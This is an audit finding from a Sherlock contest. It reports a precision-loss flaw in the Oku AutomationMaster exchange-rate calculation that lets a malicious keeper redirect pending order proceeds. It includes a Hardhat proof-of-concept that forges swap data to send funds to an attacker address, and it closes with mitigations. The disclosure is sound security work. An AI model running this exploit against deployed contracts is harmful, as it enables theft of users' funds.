# Issue M-1: Precision loss allows a mallicious user to drain amount received from orders 

Source: https://github.com/sherlock-audit/2025-07-oku-trade-order-types-judging/issues/171 

## Found by 
NHristov, bulgari, curly11, kangaroo

### Summary

Precision loss in `AutomationMaster._getExchangeRate` will cause zero exchange rates for low-priced tokens, bypassing the `minAmountReceived` checks in `Bracket.execute`, as a malicious keeper will invoke `performUpkeep` with crafted `txData` to siphon all user funds from pending orders.

### Root Cause
In 
https://github.com/sherlock-audit/2025-07-oku-trade-order-types/blob/main/oku-custom-order-types/contracts/automatedTrigger/AutomationMaster.sol#L202C1-L212C6

 In `AutomationMaster::_getExchangeRate` computes:
 ```solidity
      // filepath: AutomationMaster.sol
      function _getExchangeRate(IERC20 tokenIn, IERC20 tokenOut) internal view returns (uint256) {
          uint256 priceIn  = oracles[tokenIn].currentValue();  // USD price scaled to 1e8
          uint256 priceOut = oracles[tokenOut].currentValue(); // USD price scaled to 1e8
          return (priceIn * 1e8) / priceOut;
      }
```

Because of integer division, when `priceIn * 1e8 < priceOut` the result rounds down to `0`. This precision loss is the root cause of the exploit.
This is possible when the value of one token is high while he other is kept low e.g.:
BTC is currently valued at *120_000 USD* while a pepe coin is *0.00001137*


### Internal Pre-conditions

 1. Owner has called `[registerOracle(...)]`so that `AutomationMaster.oracles(tokenIn)` and `AutomationMaster.oracles(tokenOut)` are non-zero.
2. A Bracket (or StopLimit/OracleLess) order exists for a cheap token whose USD price yields `exchangeRate == 0`. Initially the price the exchange rate could be bigger than 10, however e.g. BTC price has pumped or the other coin went down drastically.


### External Pre-conditions

1. Off-chain oracle (e.g. PythRelay) returns USD prices scaled to 1e8, truncating any fractional part smaller than 1e-8.
2. The ratio `priceIn / priceOut` for a cheap token vs. an expensive token is below `1e-8`, causing `(priceIn*1e8)/priceOut` to evaluate to `0`.

### Attack Path

1. Initially an order is created when the exchange rate is 10 and  take profit is set to 20 and stop price to 5
2. For a short duration of time the token price goes down 10 times of the low valued token
3. In such case while the order amount initially could be 10_000 dollars(now valued at 1_000), the minimum amount calculated in AutomationMaster will be 0 because the precision loss in the exchange rate
4. **Attacker forges** a malicious [encodedTxData]pointing the swap recipient at their own address.
6. **Attacker calls**  performUpkeep and due to the base minimum amount calculated as 0, the `require` check passes and the amount that should be received to the user is now sent to the malicious user
7. This attack vector is also possible because when high slippage values are set(no checks against that so they could be set to 10_000) as they are taken into consideration while calculating the base minimum amount

### Impact

Users lose all of their pending order output tokens (WBTC) held in the Bracket, StopLimit or OracleLess contracts. The attacker (keeper) steals an unbounded amount of tokens equal to the full WBTC balance, resulting in a complete loss of user funds and any collected fees.

### PoC

Place this in the `happyPath.ts` down below

```javascript
describe("when slippage is set to maximum the order funds can be stolen", () => {
    const stopDelta = ethers.parseUnits("500", 8)
    const strikeDelta = ethers.parseUnits("100", 8)
    const strikeBips = 500
    const stopBips = 5000
    const swapInBips = 500

    let orderId: BigInt
    //setup
    before(async () => {
        //steal money for s.Bob
        await stealMoney(s.usdcWhale, await s.Bob.getAddress(), await s.USDC.getAddress(), s.usdcAmount)
        await stealMoney(s.wethWhale, await s.Bob.getAddress(), await s.WETH.getAddress(), parseEther("250"))

        //reset test oracle price
        // set high value for initial ETH price
        // here we will use the price of one bitcoin instead for usdc just for demonstration purpose
        // which currently is 120_000 USD
        // we will also set the price of weth to a very low value
        // like 0.02
        // however this could be any tokens to bitcoin
        await s.wethOracle.setPrice(ethers.parseUnits("1", 8))
        await s.usdcOracle.setPrice(ethers.parseUnits("120000", 8))
        await s.uniOracle.setPrice(s.initialUniPrice)
        await s.opOracle.setPrice(s.initialOpPrice)

        let initial = await s.Master.checkUpkeep("0x")
        expect(initial.upkeepNeeded).to.eq(false)

    })
    it("order with a low cost token and high cost token to usdc could lead to drain because of precision loss", async () => {
        const currentPrice = await s.Master.getExchangeRate(await s.WETH.getAddress(), await s.USDC.getAddress())

        await s.WETH.connect(s.Bob).approve(await s.Bracket.getAddress(), s.opAmount)

        //should be 833
        console.log("Current Price: ", currentPrice.toString())
        const bobBalanceBefore = await s.USDC.balanceOf(await s.Bob.getAddress())
        console.log("Bob's USDC balance before: ", bobBalanceBefore.toString())
        await s.Bracket.connect(s.Bob).createOrder(
            "0x",
            currentPrice + 10n, // 18
            currentPrice - 1n, //7
            parseEther("25"), // 250 weth
            await s.WETH.getAddress(),
            await s.USDC.getAddress(),
            await s.Bob.getAddress(),
            0,//5 bips fee
            500,
            500,
            "0x",
            { value: s.fee }
        )
        console.log("Order created")

        const filter = s.Bracket.filters.BracketOrderCreated
        const events = await s.Bracket.queryFilter(filter, -1)
        const event = events[0].args
        orderId = event[0]
        expect(Number(event[0])).to.not.eq(0, "Third order")

        //verify pending order exists
        const list = await s.Bracket.getPendingOrders()
        expect(list.length).to.eq(1, "1 pending order")

        
    })

    it("Check upkeep", async () => {
        //should be no upkeep needed yet
        let initial = await s.Master.checkUpkeep("0x")
        expect(initial.upkeepNeeded).to.eq(false)
        initial = await s.Bracket.checkUpkeep("0x")
        expect(initial.upkeepNeeded).to.eq(false)

        //decrease the price of weth currently 10 times
        //it represents
        await s.wethOracle.setPrice(ethers.parseUnits("0.001", 8))
        const currentPrice = await s.Master.getExchangeRate(await s.WETH.getAddress(), await s.USDC.getAddress())
        //should be 0
        console.log("Current Price: ", currentPrice.toString())

        //check upkeep
        let result = await s.Master.checkUpkeep("0x")
        expect(result.upkeepNeeded).to.eq(true, "Upkeep is now needed")
        result = await s.Bracket.checkUpkeep("0x")
        expect(result.upkeepNeeded).to.eq(true, "Upkeep is now needed")

        //check specific indexes
        let start = 0
        let finish = 1
        const abi = new AbiCoder()
        const encodedIdxs = abi.encode(["uint96", "uint96"], [start, finish])
        result = await s.Bracket.checkUpkeep(encodedIdxs)
        expect(result.upkeepNeeded).to.eq(true, "first idx updeep is needed")

        console.log("Checking from master")
        result = await s.Master.checkUpkeep(encodedIdxs)
        expect(result.upkeepNeeded).to.eq(true, "first idx updeep is needed")
    })

    it("Perform Upkeep - stop loss", async () => {
        //check upkeep

        const result = await s.Master.checkUpkeep("0x")

        //get returned upkeep data
        const data: MasterUpkeepData = await decodeUpkeepData(result.performData, s.Frank)

        //get minAmountReceived
        const minAmountReceived = await s.Master.getMinAmountReceived(data.amountIn, data.tokenIn, data.tokenOut, data.bips)
        console.log("Min Amount Received: ", minAmountReceived.toString())
        //generate encoded masterUpkeepData
        const [,,,,,,,malicious] = await ethers.getSigners()
        const balanceBefore = await s.USDC.balanceOf(malicious.address)
        console.log("MaliciousUSDC balance before: ", balanceBefore.toString())

        //we manipulate the transaction so that 
        // the receiver of the money will be the malicious address
        // instead of the order receiver/creator
        const encodedTxData = await generateUniTx(
            s.router02,
            s.UniPool,
            malicious.address,
            minAmountReceived,
            data
        )

        console.log("Gas to performUpkeep: ", await getGas(await s.Master.performUpkeep(encodedTxData)))

        const balanceAfter = await s.USDC.balanceOf(malicious.address)
        console.log("Malicious USDC balance after: ", balanceAfter.toString())
    })
})
```

### Mitigation

 - In `_getExchangeRate`Switch to a higher-precision fixed-point library (e.g. 1e18) to avoid truncation to zero for small ratios 
`(priceIn * 1e18) / priceOut`
This needs to be taken into consideration in every function that interacts in any way with `_getExchangeRate`
 - In `Bracket.execute` add `require(baseMinAmount > 0, "Invalid exchange rate")` before swapping or always require that the amount out received by the contract should be > 0, this also prevents the attack vector where the slippage is set to 10_000
 

